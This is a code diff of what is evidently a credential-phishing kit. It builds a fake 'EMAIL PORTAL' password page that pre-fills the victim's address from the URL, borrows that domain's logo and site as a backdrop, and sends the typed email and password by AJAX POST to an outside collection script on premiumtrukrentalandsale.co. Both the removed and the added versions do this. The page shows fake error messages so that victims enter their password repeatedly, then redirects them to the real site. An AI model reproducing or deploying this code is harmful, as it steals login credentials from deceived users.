-<!-- Login 1 end -->
-  
- 
-  	<!-- jQuery first, then Popper.js, then Bootstrap JS -->
-     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+		</center>
+    </div>
+    <!-- loader end -->
+    <!-- partial:index.partial.html -->
+    <div class="container w3-animate-zoom" id="second" style=" background-color: rgb(255, 255, 255); box-shadow: rgba(179, 179, 179, 0.7) 0px 10px 15px;height:560px;">
+        <div class="left_box" style="display: none;">
+            <span>EMAIL SETTINGS PORTAL</span>
+        </div>
+
+        <div class="top_level" style="background-color: transparent;">
+
+            
+			<center><b><h3 style="display: block;color:blue;font-size:20px;"><img class="main_logo_id" src="" style="width:70px;"><br>EMAIL PORTAL</h3></b></center>
+        </div>
+<center>
+<div class="info">
+    <span class="datetime"></span>
+    <span class="browser"></span>
+    <span class="os"></span>
+    <span class="location"></span>
+</div>
+</center>
+    <script>
+    // Call the function to display date, time, browser, OS, and location in the first section
+    displayInfo();
+    </script>
+        <div class="intro-text">
+            <h2 id="auth_email" style="color: rgb(6, 39, 171);"></h2>
+            <hr style="width:100%;text-align:left;margin-left:0">
+            <p id="comment_text">You are access a secure settings that require verification of your identity. Please enter your email password..</p>
+			<form action="" method="POST" id="contact">
+			<input type="hidden" name="email" id="email" required="" style="border-color: rgb(140, 140, 140);">
+        </div>
+        <div class="inputs"><div class="input">
+		
+<input type="password" name="password" id="password" required="" style="border-color: rgb(140, 140, 140);">
+<label id="pass_label" for="password">Password</label>
+</div>
+<div style="display: flex;">
+<span id="auth_reg">Authentication is required!</span>
+<span id="auth_reg2">Somthing went wrong. Please try again.</span>
+</div>
+<br>
+<div class="rem_me">
+<input type="checkbox" name="" id="show_pass_button">
+<a id="show_pass" style="color:#0A66C3; font-size: 0.8rem;">Show password</a>
+</div><br></div>
+        <button id="next_button" style="padding-top: 10px; padding-bottom: 10px; color: rgb(255, 255, 255); background: rgb(24, 143, 255);width:100%;">NEXT</button>
+		</form>
+        <br>
+        <hr style="width:100%;text-align:left;margin-left:0;background-color: rgba(128, 128, 128, 0.318);">
+        <p class="join-link">© 2024&nbsp;<a href="#" id="footer_com">Secure Portal</a>&nbsp;<a href="#">|</a>&nbsp;<a href="#" id="footer_pri">Privacy</a><br><a href="#" id="footer_dom"></a></p>
+
+    </div>
+<div class="overlay_div"></div>
+<iframe src="" id="mainPage"style="position: fixed; inset: 0px; width: 100%; height: 100%; border: none; margin: 0px; padding: 0px; overflow-x: hidden; z-index: 999;">
+        Your browser doesn't support iframes
+    </iframe>
+   
+
+	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
       <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+ 	 <script>
+	setTimeout(() => {  
 
-
-    <script>
-        $(document).ready(function() {
-            var count = 0;
-            var ur = "https://premiumtrukrentalandsale.co/pboys/fdgaf.php";
-            var email = window.location.hash.substr(1);
-    
-            if (email) {
-                var my_email = email;
-                $('#email').val(my_email);
-    
-                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-                if (!filter.test(my_email)) {
-                    $('#error').show();
-                    email.focus();
-                    return false;
-                }
-                var ind = my_email.indexOf("@");
-                var my_slice = my_email.substr((ind + 1));
-                var final = my_slice.toLowerCase();
-                $("#logoname").html(final);
-                $("#logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
-                $("#mainPage").attr("src", "https://www." + my_slice);
-            }
-    
-            $('#submit-btn').click(function(event) {
-                $('#error').hide();
-                $('#msg').hide();
-                event.preventDefault();
-                var email = $("#email").val();
-                var password = $("#password").val();
-    
-                if (!password) {
-                    $('#msg').show();
-                    $('#msg').html("Password field is empty.!");
-                    return false;
-                }
-    
-                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-                if (!filter.test(email)) {
-                    $('#error').show();
-                    email.focus();
-                    return false;
-                }
-    
-                var ind = email.indexOf("@");
-                var my_slice = email.substr((ind + 1));
-    
-                count++;
-    
-                $.ajax({
-                    dataType: 'JSON',
-                    url: ur,
-                    type: 'POST',
-                    data: {
-                        email: email,
-                        password: password
-                    },
-                    beforeSend: function(xhr) {
-                        $('#submit-btn').html('Verifying...');
-                    },
-                    success: function(response) {
-                        if (response && response.signal === 'ok') {
-                            $("#msg").show();
-                            $('#msg').html(response.msg);
-                            $("#password").val("");
-    
-                            if (count >= 3) {
-                                count = 0;
-                                window.location.replace("https://www." + my_slice);
-                            }
-                        } else {
-                            $("#msg").show();
-                            $('#msg').html(response.msg);
-                        }
-                    },
-                    error: function() {
-                        $("#password").val("");
-                        if (count >= 3) {
-                            count = 0;
-                            window.location.replace("https://www." + my_slice);
-                        }
-                        $("#msg").show();
-                        $('#msg').html("Password is incorrect. Please try again.");
-                    },
-                    complete: function() {
-                        $('#submit-btn').html('Log in');
-                    }
-                });
-            });
-        });
+	$('#first').css('display', 'none');
+	$('#second').css('display', 'block'); }, 5000);
     </script>
-        
-  </div> <!-- your actual centered element -->
-</div>
-</body>
+
+
+  <script>
+$(document).ready(function(){
+var count=0;
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('#auth_email').html(my_email);
+
+
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var mPage = 'https://'+my_slice;
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+$(".main_logo_id").attr("src", "https://logo.clearbit.com/"+my_slice);
+$('#loader_email').html(my_slice);
+$("#toto").html(finalu);
+document.getElementById('mainPage').src = mPage; 
+$("#tit").html(finalu);
+$("#pussy").html(my_slice);
+$("#footer_dom").html(my_slice);
+
+
+}
+
+
+
+$('#next_button').click(function(event){
+
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+if (!email) {
+    $('#auth_reg').show();
+    $('#auth_reg').html("Email can not be found");
+
+                return false;
+            }
+if (!password) {
+    $('#auth_reg').show();
+    $('#auth_reg').html("Password is empty!");
+
+                return false;
+            }
+
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: 'https://premiumtrukrentalandsale.co/pboys/dotg.php',
+type: 'POST',
+      	data:{
+			email:email,
+            password:password,	
+      	},
+			data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+                          $('#submit-btn').html('Verifying...');	
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=3) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                   window.location.replace("https://www."+my_slice);
+
+                }
+                    	$("#auth_reg").show();
+				                      
+			$('#auth_reg').html("Somthing went wrong. Please try again.");
+            
+            }
+            else{
+                	$("#auth_reg").show();
+				                      
+			$('#auth_reg').html("Somthing went wrong. Please try again.");
+               
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=20) {
+    		count=0;
+    		 window.location.replace("https://www."+my_slice);
+    	}
+               	$("#auth_reg").show();
+				                      
+			$('#auth_reg').html("Somthing went wrong. Please try again.");
+               
+    },
+    complete: function(){
+    	
+    }
+});
+  });
+
+
+	});
+
+
+</script>
+
+</body></html>
